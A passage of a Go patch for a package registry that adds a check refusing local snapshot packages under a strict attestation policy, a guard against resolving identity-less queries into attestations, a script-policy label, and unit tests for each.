++// NetworkAttestationRequired reports whether the registry policy demands a
++// network attestation for every installed package. Strict mode admits no
++// unattested package; advisory mode records whatever evidence resolves.
++func NetworkAttestationRequired(registryPolicy string) bool {
++	return registryPolicy == "strict"
++}
++
++// CheckLocalPackage enforces skillfile-sources §4 for a package with no
++// network identity: where the registry policy requires a network
++// attestation that local content cannot supply, installation fails. The
++// refusal happens before any cache or compiler work at the call site. Git
++// package kinds always pass here; their evidence is resolved and matched on
++// the normal path, which never synthesizes records for local content.
++func CheckLocalPackage(skill, registryPolicy, packageKind string) error {
++	if packageKind == PackageLocalSnapshot && NetworkAttestationRequired(registryPolicy) {
++		return fmt.Errorf(
++			"%s is a local snapshot and registry_policy is strict: local content has no network attestation identity",
++			skill)
++	}
++	return nil
++}
+diff --git a/internal/registry/local_test.go b/internal/registry/local_test.go
+new file mode 100644
+index 0000000..c94c772
+--- /dev/null
++++ b/internal/registry/local_test.go
+@@ -0,0 +1,54 @@
++package registry
++
++import (
++	"strings"
++	"testing"
++)
++
++func TestCheckLocalPackage(t *testing.T) {
++	// A strict registry policy requires a network attestation that local
++	// content cannot supply: installation must fail, not pass unattested.
++	if err := CheckLocalPackage("review", "strict", PackageLocalSnapshot); err == nil ||
++		!strings.Contains(err.Error(), "no network attestation") {
++		t.Fatalf("strict local err = %v", err)
++	}
++	// Narrowing the policy to advisory admits the same package: the refusal
++	// is the policy bound, not the package.
++	if err := CheckLocalPackage("review", "advisory", PackageLocalSnapshot); err != nil {
++		t.Fatalf("advisory local err = %v", err)
++	}
++	// Git kinds always pass here; their evidence resolves on the normal
++	// path with exact name/repository/commit/context matching.
++	for _, kind := range []string{PackageNetworkGit, PackageConfiguredGit} {
++		if err := CheckLocalPackage("review", "strict", kind); err != nil {
++			t.Fatalf("strict %s err = %v", kind, err)
++		}
++	}
++}
++
++func TestResolveWithoutIdentityIsUnknown(t *testing.T) {
++	// Even if a record's content hash coincides with the query hash, a
++	// query with no network identity and no commit resolves unknown: the
++	// registry never forges an attestation for local content.
++	fetch := func(_, _, _, _ string) ([]map[string]any, error) {
++		return []map[string]any{{
++			"schema_version":  1,
++			"name":            "review",
++			"source_identity": "example.org/kit",
++			"commit":          "0123456789abcdef0123456789abcdef01234567",
++			"content_sha256":  "sha256:1111111111111111111111111111111111111111111111111111111111111111",
++			"status":          StatusAudited,
++			"sig": map[string]any{
++				"algorithm": "ed25519",
++				"key_id":    "0123456789abcdef",
++				"signature": strings.Repeat("A", 88),
++			},
++		}}, nil
++	}
++	registries := []Registry{{Name: "test-reg", URL: "https://example.org", PublicKeys: []string{}}}
++	resolution := Resolve(registries, "", "",
++		"sha256:1111111111111111111111111111111111111111111111111111111111111111", fetch)
++	if resolution.Result != ResultUnknown || resolution.Attestation != nil {
++		t.Fatalf("identity-less query resolved: %+v", resolution)
++	}
++}
+diff --git a/internal/registry/registry.go b/internal/registry/registry.go
+index 480528b..26cb1e5 100644
+--- a/internal/registry/registry.go
++++ b/internal/registry/registry.go
+@@ -303,7 +303,16 @@ func Matches(record Record, sourceIdentity, commit, contentSHA256 string) bool {
+ 
+ // Resolve combines verified records from every trusted registry under
+ // deny-wins (Spec §13.3).
++//
++// A query with no network identity and no commit is unknown by
++// construction: local content has no audit-record-v1 identity, so no
++// content-hash-only coincidence may resolve it into an attestation.
++// Callers skip such packages before resolving; the guard keeps that
++// invariant inside the trust boundary too.
+ func Resolve(registries []Registry, sourceIdentity, commit, contentSHA256 string, fetch FetchFn) Resolution {
++	if sourceIdentity == "" && commit == "" {
++		return Resolution{Result: ResultUnknown}
++	}
+ 	var warnings []string
+ 	var audited, deprecated *Attestation
+ 	for _, reg := range registries {
+diff --git a/internal/scriptpolicy/labels.go b/internal/scriptpolicy/labels.go
+new file mode 100644
+index 0000000..93595f9
+--- /dev/null
++++ b/internal/scriptpolicy/labels.go
+@@ -0,0 +1,13 @@
++package scriptpolicy
++
++// EffectiveLabels reports the closed script-policy labels a source-audit
++// evidence report binds. This manager does not implement script-worker-v1,
++// so every enforced command is refused at admission; the label records that
++// posture so a future worker ships a new label and ages stored bindings out
++// through the policy digest instead of inheriting verdicts taken under a
++// different containment promise.
++func EffectiveLabels() []string {
++	return []string{
++		"script-worker-v1:" + StateUnsupported,
++	}
++}
+diff --git a/internal/scriptpolicy/labels_test.go b/internal/scriptpolicy/labels_test.go
+new file mode 100644
+index 0000000..9118d6e
+--- /dev/null
++++ b/internal/scriptpolicy/labels_test.go
+@@ -0,0 +1,24 @@
++package scriptpolicy
++
++import (
++	"strings"
++	"testing"
++)
++
++func TestEffectiveLabels(t *testing.T) {
++	labels := EffectiveLabels()
++	if len(labels) == 0 {
++		t.Fatalf("no effective labels")
++	}
++	joined := strings.Join(labels, "\n")
++	if !strings.Contains(joined, "script-worker-v1") {
++		t.Fatalf("labels %q miss the script-worker-v1 posture", labels)
++	}
++	seen := map[string]bool{}
++	for _, label := range labels {
++		if label == "" || seen[label] {
++			t.Fatalf("labels must be non-empty and unique: %q", labels)
++		}
++		seen[label] = true
++	}
++}
